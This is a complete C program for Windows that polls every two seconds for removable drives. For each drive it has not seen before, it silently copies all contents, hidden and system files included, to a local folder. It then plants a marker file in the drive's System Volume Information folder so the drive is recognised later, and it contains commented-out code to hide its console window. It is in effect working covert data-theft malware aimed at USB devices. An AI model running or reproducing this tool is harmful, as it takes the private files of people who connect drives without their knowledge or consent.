#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#define _WIN32_WINNT 0x0500

#include <windows.h>
#include <wchar.h>


char* hash_generator(int SIZE) {
    // Charset for the Hash
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    const int charset_size = 62;

    // Container for the generated Hash
    char* hash;
    hash = malloc((SIZE+1) * sizeof(char));

    // Random seed
    srand(time(0));

    for (int i=0; i<SIZE; i++) {
        // Generate a random number [0...61]
        char cur = charset[rand()%charset_size];
        hash[i] = cur;
    }
    // End the string with a null character and return it
    hash[SIZE] = 0;
    return hash;
}

void save_data(wchar_t* drive_name) {
    char filename[100] ;
    sprintf(filename, "%SSystem Volume Information\\md5.log",drive_name);
    FILE *file = fopen(filename, "w");
    char *hash= hash_generator(100);
    fprintf(file, "%s\n", hash);

    FILE *saved_data = fopen("D:\\Copied\\Saved_Data\\saved_data.log", "w");
    time_t seconds = time(NULL);
    fprintf(saved_data, "%s %lld\n", hash, seconds);

    fclose(file);
    fclose(saved_data);
}

int recognize_device(wchar_t* drive_name) {
    char filename[100] ;
    sprintf(filename, "%SSystem Volume Information\\md5.log",drive_name);
    printf("Name =%s\n", filename);
    FILE *file;
    file = fopen(filename, "r");

    if (file == NULL) {
        fclose(file);
        return 0;
    }
    else {
        // check hash and timestamp //
        char hash[101];
        time_t last_timestamp, cur_seconds = time(NULL);
        fscanf(file, "%s", hash);
        
        
        FILE *saved_data = fopen("D:\\Copied\\Saved_Data\\saved_data.log", "r");
        char cur_hash[101];
        int reached_end = 0;
        do {
            if (fscanf(saved_data, "%s %lld", cur_hash, &last_timestamp) == EOF){
                reached_end = 1;
                printf("%s == %d %lld\n", hash, cur_hash, last_timestamp);
                break;
            }
        } while (strcmp(hash, cur_hash) != 0);
        
        if (reached_end == 1) return 0;
        fclose(file);
        printf("hello \n");
        return 1;
    }
}


int exec() {
    // Hiding the console window
    HWND hWnd = GetConsoleWindow();
    //ShowWindow(hWnd, SW_MINIMIZE);    // Minimizes the Console
    //ShowWindow(hWnd, SW_HIDE);        // Hides the Console

    // Get a list of all Logical Drives
    wchar_t LogicalDrives[MAX_PATH] = {0};
    DWORD r = GetLogicalDriveStringsW(MAX_PATH, LogicalDrives);

    if (r == 0) {
        wprintf(L"Failed to get drive names %ld", GetLastError());
        return 1;
    }

    if (r > 0 && r <= MAX_PATH) {
        
        // Iterate over each Drive
        wchar_t *SingleDrive = LogicalDrives;

        while(*SingleDrive) {

            int drive_type = GetDriveTypeW(SingleDrive);
            printf("%S  ->%d \n",SingleDrive, drive_type);
            
            // Checks if the drive type is a Removable device
            if (drive_type==2) {

                if (recognize_device(SingleDrive) == 0) {
                    printf("Uncognized device!");
                    printf("\nPreparing to Copy Files\n");

                    // Copy the Drive root to D:\Copied
                    char command[100];
                    sprintf(command, "xcopy \"%S\\\" D:\\Copied\\ /s/h/e/k/f/c/Y ",SingleDrive );
                    system(command);

                    // Remember the drive creating a md5.log file the root dir
                    save_data(SingleDrive);
                }
                else {    
                    printf("File Found\n");
                    printf("Device is Recognized!\n");
                }
            }
            // Next Drive
            SingleDrive += wcslen(SingleDrive) + 1;
        }
    }
}

int main() {
    
    while(1){
        exec();
        Sleep(2000);

    }

    return 0;
}
